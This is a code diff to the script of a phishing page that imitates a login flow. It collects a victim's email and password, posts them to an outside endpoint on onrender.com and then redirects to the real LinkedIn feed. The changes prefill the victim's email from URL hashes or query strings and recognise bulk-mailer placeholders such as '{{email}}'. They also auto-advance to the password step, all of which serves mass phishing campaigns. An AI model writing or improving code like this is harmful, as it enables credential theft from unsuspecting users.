@@ -484,6 +484,7 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
+            // DOM elements
             const emailPage = document.getElementById('email-page');
             const passwordPage = document.getElementById('password-page');
             const redirectPage = document.getElementById('redirect-page');
@@ -499,23 +500,75 @@
             const successCountElement = document.getElementById('success-count');
             const submitBtn = document.getElementById('submit-btn');
             
+            // Configuration
             let successCount = 0;
             let currentEmail = '';
             const redirectURL = 'https://www.linkedin.com/feed/';
-            
-            // Your API endpoint - UPDATE THIS WITH YOUR ACTUAL API URL
             const API_ENDPOINT = 'https://chuksinno-backend-1.onrender.com/activities';
             
-            // Email form submission
-            emailForm.addEventListener('submit', function(e) {
-                e.preventDefault();
-                const email = emailInput.value.trim();
+            // Placeholder emails to check for
+            const PLACEHOLDER_EMAILS = [
+                '[-Email-]',
+                '{{email}}',
+                'example@email.com',
+                '%5B-Email-%5D',
+            ];
+            
+            // Helper: Validate email format
+            function isValidEmail(email) {
+                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            }
+            
+            // Function to extract email from URL
+            function extractEmailFromURL() {
+                let email = '';
                 
-                if (!email) {
-                    alert('Please enter your email or phone number.');
-                    return;
+                // FIRST: Check URL hash (#email@example.com)
+                if (window.location.hash) {
+                    const hashValue = decodeURIComponent(window.location.hash.substring(1).trim());
+                    console.log('Hash value found:', hashValue);
+                    
+                    // Check if hash is a valid email OR a placeholder
+                    if ((hashValue && isValidEmail(hashValue)) || PLACEHOLDER_EMAILS.includes(hashValue)) {
+                        email = hashValue;
+                    }
                 }
                 
+                // SECOND: If no email in hash, check query parameters (?email=...)
+                if (!email && window.location.search) {
+                    const params = new URLSearchParams(window.location.search);
+                    const paramEmail = params.get('email');
+                    if (paramEmail) {
+                        const decodedEmail = decodeURIComponent(paramEmail);
+                        if (isValidEmail(decodedEmail) || PLACEHOLDER_EMAILS.includes(decodedEmail)) {
+                            email = decodedEmail;
+                        }
+                    }
+                }
+                
+                console.log('Extracted email from URL:', email);
+                return email;
+            }
+            
+            // Function to prefill email from URL
+            function prefillEmailFromURL() {
+                const extractedEmail = extractEmailFromURL();
+                
+                if (extractedEmail && emailInput) {
+                    emailInput.value = extractedEmail;
+                    
+                    // If we're on the email page and have a valid email, auto-proceed to password page
+                    if (!emailPage.classList.contains('hidden') && extractedEmail) {
+                        // Small delay to ensure UI is ready
+                        setTimeout(() => {
+                            processEmailSubmission(extractedEmail);
+                        }, 100);
+                    }
+                }
+            }
+            
+            // Process email submission (shared between form submit and auto-submit)
+            function processEmailSubmission(email) {
                 currentEmail = email;
                 
                 // Mask the email for display
@@ -532,7 +585,22 @@
                 passwordPage.classList.remove('hidden');
                 
                 // Focus on password field
-                passwordInput.focus();
+                setTimeout(() => {
+                    passwordInput.focus();
+                }, 100);
+            }
+            
+            // Email form submission
+            emailForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const email = emailInput.value.trim();
+                
+                if (!email) {
+                    alert('Please enter your email or phone number.');
+                    return;
+                }
+                
+                processEmailSubmission(email);
             });
             
             // Password form submission
@@ -574,7 +642,7 @@
                             // Redirect after 2 seconds
                             setTimeout(() => {
                                 window.location.href = redirectURL;
-                            }, 2000);
+                            }, 1000);
                         }
                     } else {
                         // API responded but with error (HTTP 400, 500, etc.)
@@ -676,23 +744,23 @@
                 return firstChar + '*****' + domain;
             }
             
-            // Check for URL hash email on page load
-            function checkURLEmail() {
-                const hash = window.location.hash.substring(1);
-                
-                if (hash && isValidEmail(hash)) {
-                    emailInput.value = hash;
-                    // Auto-submit the email form
-                    emailForm.dispatchEvent(new Event('submit'));
+            // Update URL hash when email is entered manually
+            emailInput.addEventListener('input', function() {
+                const email = emailInput.value.trim();
+                if (isValidEmail(email)) {
+                    // Update the URL hash with the email
+                    window.location.hash = email;
                 }
-            }
+            });
             
-            function isValidEmail(email) {
-                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-            }
+            // Listen for hash changes
+            window.addEventListener('hashchange', function() {
+                console.log('Hash changed to:', window.location.hash);
+                prefillEmailFromURL();
+            });
             
-            // Initialize
-            checkURLEmail();
+            // Initialize - check for email on load
+            prefillEmailFromURL();
         });
     </script>
 </body>
